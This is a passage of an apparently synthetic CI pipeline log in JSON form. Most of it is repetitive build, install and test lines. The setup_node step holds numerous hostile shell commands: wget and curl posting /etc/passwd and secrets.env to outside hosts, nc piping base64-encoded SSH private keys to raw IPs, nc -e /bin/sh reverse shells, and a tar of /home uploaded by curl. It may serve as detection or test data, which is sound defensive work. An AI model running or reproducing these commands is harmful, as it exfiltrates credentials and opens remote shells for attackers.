ValueError\nArtifact uploaded: build.tar.gz (16MB)\nStep 7/10: Building\nFAILED: test_user_create\nInstalling axios@1.16.0\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (45MB)\n[12:00:33] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (19MB)\nCache hit for key-2213\nCompiling src/handler.rs...\nWARNING: jest has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n=== Step e2e_tests completed ===\n=== Step: install_dependencies ===\n\u2713 build completed\nCache hit for key-4766\nInstalling lodash@5.13.0\nInstalling express@4.7.0\nInstalling express@5.17.0\nCache hit for key-9096\nStep 2/10: Building\nStep 3/10: Building\n[12:00:33] ERROR: Connection failed\n[12:00:33] ERROR: Connection failed\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\nCompiling src/handler.rs...\nException: RuntimeError\nCache hit for key-5164\n\u2713 test completed\nInstalling lodash@3.15.0\nInstalling webpack@1.19.0\n\u2713 lint completed\nCache hit for key-4830\nStep 9/10: Building\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/service.java...\nStep 2/10: Building\nStep 5/10: Building\nCompiling src/service.java...\nCompiling src/utils.go...\n\u2717 build failed with exit code 78\n\u2713 test completed\n\u2713 build completed\n[12:00:33] INFO: Processing request\n\u2713 test completed\n[12:00:33] INFO: Processing request\n\u2713 test completed\n[12:00:33] INFO: Processing request\n\u2713 test completed\n[12:00:33] INFO: Processing request\nCompiling src/index.js...\nStep 4/10: Building\n  PASS: test_api_health (388ms)\nInstalling react@1.10.0\n[12:00:33] INFO: Processing request\n\u2713 test completed\n[12:00:33] INFO: Processing request\n  PASS: test_api_health (225ms)\n\u2713 lint completed\n[12:00:33] INFO: Processing request\nCache hit for key-2089\n\u2713 test completed\n[12:00:33] INFO: Processing request\nCompiling src/service.java...\nCache hit for key-2501\n[12:00:33] INFO: Processing request\nInstalling jest@4.13.0\nInstalling eslint@5.13.0\nArtifact uploaded: build.tar.gz (5MB)\n\u2713 test completed\nStep 7/10: Building\n  PASS: test_cache_hit (82ms)\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\n\u2713 test completed\nArtifact uploaded: build.tar.gz (5MB)\n  PASS: test_cache_hit (398ms)\nCache hit for key-7610\n\u2713 build completed\n[12:00:33] WARN: Deprecated API usage\nCache hit for key-4171\n  PASS: test_cache_hit (364ms)\nArtifact uploaded: build.tar.gz (11MB)\nInstalling webpack@2.10.0\nCompiling src/index.js...\nCompiling src/index.js...\n  PASS: test_api_health (248ms)\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (19MB)\n  PASS: test_api_health (313ms)\nCache hit for key-7365\nCache hit for key-1937\nInstalling express@1.4.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_cache_hit (320ms)\n\u2717 build failed with exit code 18\nCompiling src/utils.go...\nCache hit for key-1732\n\u2713 test completed\nArtifact uploaded: build.tar.gz (26MB)\n\u2713 test completed\n  PASS: test_cache_hit (491ms)\nArtifact uploaded: build.tar.gz (29MB)\n\u2713 build completed\nInstalling react@3.19.0\n\u2713 lint completed\n  PASS: test_auth_login (123ms)\nCache hit for key-5266\n\u2713 test completed\nArtifact uploaded: build.tar.gz (11MB)\n  PASS: test_db_connect (312ms)\nStep 9/10: Building\nCompiling src/service.java...\n[12:00:33] INFO: Processing request\nInstalling eslint@2.7.0\n[12:00:33] INFO: Processing request\n\u2713 test completed\nWARNING: eslint has known vulnerabilities\nCache hit for key-2598\nCompiling src/service.java...\nFAILED: test_db_connect\nCache hit for key-4869\n\u2713 lint completed\n  PASS: test_auth_login (255ms)\nStep 10/10: Building\n  PASS: test_db_connect (491ms)\n  PASS: test_cache_hit (316ms)\n  PASS: test_api_health (377ms)\nCompiling src/service.java...\n\u2713 lint completed\nInstalling prettier@3.7.0\nStep 9/10: Building\nCompiling src/index.js...\nWARNING: express has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_auth_login (51ms)\nStep 4/10: Building\nInstalling webpack@2.6.0\n  PASS: test_api_health (136ms)\n[12:00:33] INFO: Processing request\n  PASS: test_db_connect (355ms)\nArtifact uploaded: build.tar.gz (15MB)\n\u2713 build completed\nStep 5/10: Building\nInstalling express@2.13.0\nFAILED: test_user_create\nCache hit for key-4183\nArtifact uploaded: build.tar.gz (50MB)\nWARNING: prettier has known vulnerabilities\n\u2713 build completed\nCompiling src/main.py...\n=== Step install_dependencies completed ===\n=== Step: deploy_production ===\nCache hit for key-8781\nInstalling lodash@4.17.0\nInstalling eslint@1.1.0\nArtifact uploaded: build.tar.gz (23MB)\n  PASS: test_db_connect (264ms)\nArtifact uploaded: build.tar.gz (13MB)\n\u2713 test completed\nCompiling src/index.js...\n  PASS: test_auth_login (355ms)\nCompiling src/index.js...\nInstalling prettier@3.6.0\n[12:00:33] INFO: Processing request\nInstalling react@4.8.0\n\u2713 build completed\nWARNING: react has known vulnerabilities\nCompiling src/utils.go...\nCompiling src/index.js...\n[12:00:33] INFO: Processing request\nInstalling lodash@2.16.0\nStep 3/10: Building\nCompiling src/main.py...\nCompiling src/service.java...\nInstalling axios@5.10.0\n[12:00:33] INFO: Processing request\n\u2713 build completed\n  PASS: test_api_health (222ms)\nCache hit for key-2808\nStep 8/10: Building\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (7MB)\nInstalling jest@5.15.0\nCache hit for key-2621\nCache hit for key-8101\nArtifact uploaded: build.tar.gz (11MB)\nCache hit for key-9773\nWARNING: express has known vulnerabilities\nInstalling jest@2.11.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 1/10: Building\nCache hit for key-7597\nArtifact uploaded: build.tar.gz (37MB)\nInstalling lodash@4.3.0\nInstalling prettier@2.17.0\n[12:00:33] WARN: Deprecated API usage\n[12:00:33] INFO: Processing request\n  PASS: test_api_health (375ms)\nCache hit for key-9677\nCompiling src/utils.go...\nInstalling eslint@3.9.0\nCache hit for key-8183\nStep 7/10: Building\n\u2713 test completed\nCompiling src/service.java...\nCompiling src/main.py...\n\u2713 lint completed\nStep 6/10: Building\nException: TypeError\n\u2713 lint completed\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (44MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (20MB)\nCompiling src/app.ts...\nCache hit for key-9453\n  PASS: test_cache_hit (283ms)\nInstalling jest@1.19.0\nArtifact uploaded: build.tar.gz (35MB)\n[12:00:33] INFO: Processing request\n  PASS: test_user_create (316ms)\n  PASS: test_user_create (161ms)\nArtifact uploaded: build.tar.gz (42MB)\nStep 8/10: Building\n[12:00:33] INFO: Processing request\nFAILED: test_user_create\n[12:00:33] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (19MB)\nInstalling express@5.5.0\nCache hit for key-4141\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\nFAILED: test_db_connect\nWARNING: jest has known vulnerabilities\nWARNING: eslint has known vulnerabilities\nInstalling express@1.16.0\nException: TypeError\nInstalling eslint@5.19.0\n[12:00:33] WARN: Deprecated API usage\nCompiling src/app.ts...\n[12:00:33] INFO: Processing request\n  PASS: test_api_health (400ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:33] INFO: Processing request\n  PASS: test_api_health (32ms)\nArtifact uploaded: build.tar.gz (50MB)\nArtifact uploaded: build.tar.gz (22MB)\nCompiling src/main.py...\n[12:00:33] INFO: Processing request\nInstalling jest@2.12.0\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\n\u2717 build failed with exit code 47\n\u2713 lint completed\n  PASS: test_cache_hit (416ms)\nInstalling axios@3.16.0\nCompiling src/service.java...\nCache hit for key-7012\nInstalling axios@5.16.0\n[12:00:33] INFO: Processing request\nStep 1/10: Building\nCompiling src/service.java...\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\nCache hit for key-2501\nArtifact uploaded: build.tar.gz (37MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:33] INFO: Processing request\n\u2713 lint completed\n\u2713 test completed\n  PASS: test_user_create (170ms)\nCompiling src/utils.go...\nInstalling eslint@1.14.0\n[12:00:33] WARN: Deprecated API usage\nCache hit for key-5251\nException: NullPointerException\nInstalling prettier@2.10.0\nArtifact uploaded: build.tar.gz (16MB)\n  PASS: test_user_create (128ms)\nCache hit for key-9869\n[12:00:33] INFO: Processing request\n\u2713 test completed\n  PASS: test_auth_login (347ms)\nCache hit for key-6915\n  PASS: test_user_create (203ms)\nStep 1/10: Building\n[12:00:33] INFO: Processing request\n  PASS: test_auth_login (481ms)\n\u2713 lint completed\nCache hit for key-2283\n\u2713 test completed\nWARNING: lodash has known vulnerabilities\n=== Step deploy_production completed ===\n=== Step: integration_tests ===\n[12:00:33] WARN: Deprecated API usage\n\u2713 build completed\nArtifact uploaded: build.tar.gz (45MB)\n  PASS: test_db_connect (272ms)\nCache hit for key-6087\n[12:00:33] WARN: Deprecated API usage\n\u2713 build completed\nCache hit for key-8291\n  PASS: test_cache_hit (215ms)\nInstalling axios@3.20.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-2425\n\u2713 lint completed\nStep 2/10: Building\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (37MB)\nInstalling react@3.5.0\n[12:00:33] INFO: Processing request\nCache hit for key-8462\nArtifact uploaded: build.tar.gz (27MB)\nCompiling src/main.py...\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (7MB)\nStep 1/10: Building\nInstalling jest@5.9.0\nWARNING: eslint has known vulnerabilities\n[12:00:33] INFO: Processing request\n\u2713 lint completed\n[12:00:33] ERROR: Connection failed\n  PASS: test_db_connect (231ms)\n  PASS: test_cache_hit (212ms)\nCompiling src/utils.go...\n[12:00:33] ERROR: Connection failed\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (28MB)\n\u2713 test completed\nStep 3/10: Building\nCompiling src/utils.go...\n  PASS: test_db_connect (264ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-4589\n\u2713 test completed\n[12:00:33] INFO: Processing request\n\u2717 build failed with exit code 67\n\u2713 test completed\n\u2713 build completed\nInstalling webpack@2.13.0\nStep 10/10: Building\nStep 1/10: Building\n\u2713 build completed\nInstalling react@5.11.0\nInstalling eslint@2.10.0\nStep 5/10: Building\nInstalling react@1.10.0\n  PASS: test_user_create (378ms)\nStep 8/10: Building\n  PASS: test_db_connect (139ms)\nCache hit for key-3566\nCache hit for key-4594\nCache hit for key-9607\nArtifact uploaded: build.tar.gz (48MB)\nCache hit for key-1182\nArtifact uploaded: build.tar.gz (35MB)\n[12:00:33] INFO: Processing request\nCache hit for key-7840\n\u2713 test completed\n[12:00:33] ERROR: Connection failed\nStep 9/10: Building\n  PASS: test_auth_login (100ms)\n\u2717 build failed with exit code 82\nCache hit for key-6510\n[12:00:33] INFO: Processing request\nCache hit for key-4655\n[12:00:33] WARN: Deprecated API usage\nCache hit for key-8646\n  PASS: test_user_create (111ms)\n[12:00:33] INFO: Processing request\n\u2713 test completed\nWARNING: webpack has known vulnerabilities\n  PASS: test_api_health (182ms)\n\u2713 build completed\nInstalling prettier@3.9.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (23MB)\nInstalling react@2.11.0\nInstalling prettier@1.18.0\nCompiling src/main.py...\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (30MB)\nCache hit for key-6618\nCache hit for key-8519\n[12:00:33] INFO: Processing request\n  PASS: test_api_health (187ms)\n  PASS: test_api_health (342ms)\nArtifact uploaded: build.tar.gz (25MB)\nStep 5/10: Building\nStep 1/10: Building\n[12:00:33] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling jest@1.12.0\nArtifact uploaded: build.tar.gz (12MB)\nCache hit for key-6637\nInstalling react@4.9.0\nArtifact uploaded: build.tar.gz (33MB)\nCache hit for key-6468\n  PASS: test_api_health (1ms)\nArtifact uploaded: build.tar.gz (14MB)\nException: RuntimeError\n\u2713 build completed\nCompiling src/service.java...\nCompiling src/main.py...\n  PASS: test_db_connect (246ms)\nStep 1/10: Building\n[12:00:33] WARN: Deprecated API usage\n  PASS: test_api_health (306ms)\nCompiling src/handler.rs...\n\u2713 lint completed\n  PASS: test_auth_login (472ms)\n\u2717 build failed with exit code 50\nCompiling src/service.java...\n[12:00:33] INFO: Processing request\n  PASS: test_api_health (72ms)\nInstalling react@2.20.0\nStep 8/10: Building\n  PASS: test_cache_hit (318ms)\nStep 5/10: Building\nCache hit for key-8930\nCompiling src/utils.go...\nStep 3/10: Building\nCache hit for key-2613\nStep 1/10: Building\n  PASS: test_db_connect (434ms)\nArtifact uploaded: build.tar.gz (3MB)\n\u2713 lint completed\nWARNING: webpack has known vulnerabilities\n[12:00:33] INFO: Processing request\nInstalling eslint@2.6.0\n  PASS: test_auth_login (378ms)\nCache hit for key-7924\nCompiling src/app.ts...\n  PASS: test_api_health (274ms)\nInstalling axios@2.0.0\n=== Step integration_tests completed ===\n=== Step: upload_artifacts ===\n  PASS: test_user_create (158ms)\n  PASS: test_auth_login (67ms)\n  PASS: test_user_create (104ms)\nCache hit for key-4557\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\nCache hit for key-7638\n  PASS: test_auth_login (332ms)\n[12:00:33] INFO: Processing request\n  PASS: test_cache_hit (463ms)\n\u2713 test completed\nCache hit for key-4597\nStep 3/10: Building\nCache hit for key-4454\nArtifact uploaded: build.tar.gz (41MB)\nStep 5/10: Building\nInstalling jest@1.13.0\n  PASS: test_user_create (245ms)\nCompiling src/service.java...\n  PASS: test_user_create (280ms)\n\u2713 test completed\nCache hit for key-2473\nInstalling axios@3.0.0\n  PASS: test_user_create (398ms)\nCompiling src/handler.rs...\n\u2713 build completed\nCache hit for key-4944\nStep 9/10: Building\n[12:00:33] WARN: Deprecated API usage\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (38MB)\nInstalling eslint@3.6.0\n\u2713 test completed\nStep 3/10: Building\n  PASS: test_auth_login (321ms)\nCache hit for key-9020\n[12:00:33] ERROR: Connection failed\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (37MB)\n[12:00:33] INFO: Processing request\nStep 8/10: Building\n  PASS: test_api_health (462ms)\n[12:00:33] INFO: Processing request\nStep 9/10: Building\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:33] INFO: Processing request\n\u2713 lint completed\nInstalling axios@5.15.0\n  PASS: test_db_connect (312ms)\nCache hit for key-3752\nCompiling src/main.py...\nCompiling src/index.js...\n\u2717 build failed with exit code 21\nStep 2/10: Building\n\u2713 test completed\n  PASS: test_db_connect (207ms)\nException: RuntimeError\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (32MB)\nStep 2/10: Building\n\u2713 build completed\nCache hit for key-5332\n[12:00:33] INFO: Processing request\n\u2713 build completed\n  PASS: test_api_health (123ms)\nArtifact uploaded: build.tar.gz (12MB)\nCompiling src/index.js...\nCompiling src/index.js...\nCompiling src/index.js...\n\u2713 build completed\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (1MB)\n[12:00:33] INFO: Processing request\nStep 5/10: Building\nCompiling src/index.js...\nFAILED: test_db_connect\nInstalling webpack@1.2.0\n[12:00:33] INFO: Processing request\nInstalling react@2.19.0\nInstalling prettier@4.18.0\n\u2713 build completed\n\u2713 build completed\nStep 9/10: Building\n  PASS: test_api_health (373ms)\nCache hit for key-2666\nArtifact uploaded: build.tar.gz (23MB)\n\u2713 lint completed\n[12:00:33] WARN: Deprecated API usage\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (3MB)\n  PASS: test_api_health (278ms)\n\u2713 test completed\nStep 2/10: Building\nStep 3/10: Building\n\u2713 lint completed\nCache hit for key-3948\n[12:00:33] INFO: Processing request\n\u2713 lint completed\n\u2713 test completed\nCompiling src/handler.rs...\n  PASS: test_user_create (495ms)\n\u2713 test completed\n\u2713 lint completed\nFAILED: test_db_connect\nCompiling src/main.py...\n  PASS: test_auth_login (404ms)\nInstalling webpack@1.6.0\nCompiling src/app.ts...\nInstalling lodash@3.13.0\n[12:00:33] INFO: Processing request\nCompiling src/main.py...\nInstalling lodash@1.18.0\n\u2713 lint completed\nCompiling src/handler.rs...\n\u2713 test completed\nCache hit for key-1071\nInstalling lodash@4.13.0\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (19MB)\n\u2713 build completed\n  PASS: test_cache_hit (346ms)\nInstalling eslint@2.4.0\nWARNING: prettier has known vulnerabilities\nCache hit for key-4528\n\u2713 test completed\nCompiling src/service.java...\n\u2713 build completed\nCompiling src/service.java...\nCache hit for key-2746\nCache hit for key-4155\n  PASS: test_user_create (496ms)\n\u2713 lint completed\nCache hit for key-8343\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-8941\nStep 7/10: Building\nCache hit for key-9573\nInstalling axios@1.15.0\nStep 3/10: Building\n=== Step upload_artifacts completed ===\n=== Step: setup_node ===\nCompiling src/index.js...\nInstalling prettier@1.2.0\n  PASS: test_user_create (438ms)\nCache hit for key-7656\nInstalling webpack@4.1.0\n  PASS: test_api_health (451ms)\nArtifact uploaded: build.tar.gz (36MB)\n\u2713 lint completed\n\u2713 build completed\nCache hit for key-6951\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (3MB)\nCompiling src/utils.go...\n  PASS: test_db_connect (55ms)\n  PASS: test_db_connect (388ms)\nArtifact uploaded: build.tar.gz (38MB)\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\n[12:00:33] INFO: Processing request\n\u2717 build failed with exit code 116\n  PASS: test_api_health (336ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling express@5.14.0\ncurl -X POST https://test.io/collect -d @secrets.env\nCompiling src/service.java...\n\u2713 lint completed\nnc -e /bin/sh 7.86.111.40 4038\nException: ValueError\n[12:00:33] ERROR: Connection failed\nStep 1/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (24MB)\nInstalling axios@2.17.0\nStep 3/10: Building\nCompiling src/app.ts...\nCache hit for key-4730\nArtifact uploaded: build.tar.gz (34MB)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 44.235.243.64 64004\nInstalling react@2.6.0\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nSending 228MB of data to acme.corp\nCompiling src/main.py...\ncurl -X POST https://cloud.services/collect -d @secrets.env\n  PASS: test_cache_hit (337ms)\nCache hit for key-3179\nArtifact uploaded: build.tar.gz (23MB)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 209.23.186.131 10269\nCompiling src/index.js...\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nCache hit for key-3081\nArtifact uploaded: build.tar.gz (21MB)\nInstalling jest@1.2.0\nCache hit for key-9834\nStep 1/10: Building\n\u2713 build completed\nInstalling prettier@3.20.0\necho $(cat ~/.ssh/id_rsa) | base64 | nc 174.140.34.217 1121\nCache hit for key-6070\nCache hit for key-2975\nCache hit for key-1766\ncurl -X POST https://startup.dev/collect -d @secrets.env\n[12:00:33] INFO: Processing request\nStep 3/10: Building\n  PASS: test_auth_login (393ms)\n[12:00:33] WARN: Deprecated API usage\nStep 7/10: Building\n\u2713 build completed\nStep 10/10: Building\nSending 397MB of data to acme.corp\nnc -e /bin/sh 215.19.250.182 5185\n\u2713 lint completed\nInstalling react@1.1.0\nInstalling prettier@2.17.0\nArtifact uploaded: build.tar.gz (26MB)\nCache hit for key-8270\nCompiling src/main.py...\n\u2713 lint completed\n  PASS: test_auth_login (289ms)\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (28MB)\nInstalling axios@3.0.0\n\u2713 lint completed\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nArtifact uploaded: build.tar.gz (45MB)\nStep 4/10: Building\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nCache hit for key-6602\n\u2713 test completed\nArtifact uploaded: build.tar.gz (39MB)\n  PASS: test_api_health (158ms)\ncurl -X POST https://example.com/collect -d @secrets.env\n\u2713 lint completed\n  PASS: test_cache_hit (386ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (12MB)\n  PASS: test_user_create (451ms)\nCache hit for key-9539\n[12:00:33] WARN: Deprecated API usage\n\u2713 lint completed\nCache hit for key-6647\n\u2713 build completed\nInstalling express@3.2.0\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (29MB)\nArtifact uploaded: build.tar.gz (29MB)\nInstalling lodash@3.9.0\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (8MB)\nCache hit for key-1373\nCompiling src/utils.go...\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (3MB)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (40MB)\nInstalling prettier@2.7.0\nnc -e /bin/sh 140.218.158.142 24660\nArtifact uploaded: build.tar.gz (38MB)\nCache hit for key-6240\nStep 6/10: Building\nCache hit for key-4737\nInstalling express@2.9.0\n[12:00:33] INFO: Processing request\necho $(cat ~/.ssh/id_rsa) | base64 | nc 141.247.130.145 45764\nStep 2/10: Building\ncurl -X POST https://startup.dev/collect -d @secrets.env\n\u2713 test completed\nCompiling src/app.ts...\nInstalling lodash@5.17.0\nInstalling express@3.2.0\nStep 2/10: Building\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\nCache hit for key-8322\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (18MB)\nInstalling prettier@3.10.0\n[12:00:33] INFO: Processing request\n  PASS: test_auth_login (20ms)\n\u2713 build completed\n  PASS: test_user_create (160ms)\n  PASS: test_user_create (162ms)\nCompiling src/service.java...\nStep 10/10: Building\necho $(cat ~/.ssh/id_rsa) | base64 | nc 154.200.199.166 19812\nCache hit for key-2720\nInstalling axios@2.1.0\n  PASS: test_cache_hit (366ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:33] INFO: Processing request\nCompiling src/main.py...\n  PASS: test_cache_hit (251ms)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 24.31.55.76 32385\nCompiling src/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 5/10: Building\n  PASS: test_db_connect (446ms)\nArtifact uploaded: build.tar.gz (2MB)\nArtifact uploaded: build.tar.gz (31MB)\ncurl -X POST https://startup.dev/collect -d @secrets.env\n[12:00:33] INFO: Processing request\nInstalling express@2.13.0\necho $(cat ~/.ssh/id_rsa) | base64 | nc 70.187.83.222 46504\nInstalling axios@1.1.0\nInstalling axios@4.5.0\n  PASS: test_db_connect (337ms)\n\u2713 build completed\n=== Step setup_node completed ===",
    "steps": [
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-20T12:00:33.547797",
        "finished_at": "2025-12-20T12:00:41.279198",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Installing react@1.11.0",
          "\u2713 lint completed",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_cache_hit (199ms)",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_cache_hit (55ms)",
          "\u2713 test completed",
          "Cache hit for key-3197",
          "Cache hit for key-6629",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Installing lodash@1.15.0",
          "Compiling src/main.py...",
          "Installing prettier@3.4.0",
          "\u2713 build completed",
          "Step 3/10: Building",
          "[12:00:33] INFO: Processing request",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "Installing webpack@1.2.0",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Cache hit for key-7793",
          "\u2713 test completed",
          "Installing axios@5.0.0",
          "\u2713 lint completed",
          "Installing prettier@2.18.0",
          "\u2713 test completed",
          "[12:00:33] INFO: Processing request",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Step 3/10: Building",
          "Step 3/10: Building",
          "Installing react@4.6.0",
          "Compiling src/app.ts...",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Compiling src/service.java...",
          "Compiling src/handler.rs...",
          "Compiling src/index.js...",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 lint completed",
          "WARNING: express has known vulnerabilities",
          "\u2717 build failed with exit code 87",
          "Cache hit for key-8345",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2717 build failed with exit code 37",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (23MB)",
          "  PASS: test_user_create (294ms)",
          "\u2713 build completed",
          "Cache hit for key-3849",
          "\u2713 test completed",
          "Installing eslint@3.16.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 lint completed",
          "  PASS: test_auth_login (208ms)",
          "[12:00:33] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_auth_login (201ms)",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Installing eslint@3.8.0",
          "Step 7/10: Building",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "Step 3/10: Building",
          "\u2713 test completed",
          "  PASS: test_db_connect (270ms)",
          "Compiling src/handler.rs...",
          "Cache hit for key-2952",
          "\u2713 test completed",
          "Step 2/10: Building",
          "[12:00:33] INFO: Processing request",
          "Step 9/10: Building",
          "Installing jest@3.7.0",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Installing prettier@2.14.0",
          "\u2713 lint completed",
          "\u2713 build completed",
          "[12:00:33] ERROR: Connection failed",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Installing express@4.14.0",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Installing axios@5.2.0",
          "Installing jest@2.20.0",
          "  PASS: test_db_connect (194ms)",
          "Step 2/10: Building",
          "\u2713 lint completed",
          "  PASS: test_api_health (286ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Compiling src/app.ts...",
          "Compiling src/main.py...",
          "Cache hit for key-6659",
          "\u2713 test completed",
          "Step 8/10: Building",
          "  PASS: test_api_health (260ms)",
          "[12:00:33] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "  PASS: test_auth_login (190ms)",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "  PASS: test_db_connect (322ms)",
          "\u2713 test completed",
          "FAILED: test_user_create",
          "  PASS: test_api_health (185ms)",
          "Compiling src/main.py...",
          "[12:00:33] WARN: Deprecated API usage",
          "Installing eslint@3.7.0",
          "  PASS: test_auth_login (113ms)",
          "  PASS: test_auth_login (268ms)",
          "Compiling src/index.js...",
          "Step 1/10: Building",
          "Cache hit for key-4370",
          "[12:00:33] INFO: Processing request",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (21MB)",
          "[12:00:33] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (18MB)",
          "[12:00:33] INFO: Processing request",
          "Step 9/10: Building",
          "\u2713 test completed",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Cache hit for key-9063",
          "Installing react@1.12.0",
          "Step 2/10: Building",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-20T12:00:41.279198",
        "finished_at": "2025-12-20T12:00:46.433465",
        "log_lines": [
          "=== Step: checkout ===",
          "Compiling src/utils.go...",
          "Compiling src/service.java...",
          "Installing react@1.12.0",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Installing express@3.9.0",
          "  PASS: test_api_health (486ms)",
          "[12:00:33] INFO: Processing request",
          "Step 2/10: Building",
          "Installing react@5.9.0",
          "Compiling src/main.py...",
          "Installing react@2.7.0",
          "[12:00:33] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Cache hit for key-1419",
          "Cache hit for key-3299",
          "\u2713 test completed",
          "Step 7/10: Building",
          "Installing jest@5.14.0",
          "[12:00:33] ERROR: Connection failed",
          "[12:00:33] INFO: Processing request",
          "FAILED: test_cache_hit",
          "\u2713 test completed",
          "\u2717 build failed with exit code 52",
          "Step 3/10: Building",
          "Step 10/10: Building",
          "Cache hit for key-2377",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Installing jest@1.2.0",
          "\u2713 lint completed",
          "Cache hit for key-7037",
          "Step 10/10: Building",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_db_connect (286ms)",
          "[12:00:33] INFO: Processing request",
          "Step 3/10: Building",
          "Cache hit for key-1630",
          "Cache hit for key-4255",
          "Cache hit for key-3774",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Compiling src/utils.go...",
          "  PASS: test_db_connect (10ms)",
          "Compiling src/main.py...",
          "Installing express@3.3.0",
          "Step 7/10: Building",
          "\u2713 build completed",
          "Installing jest@1.16.0",
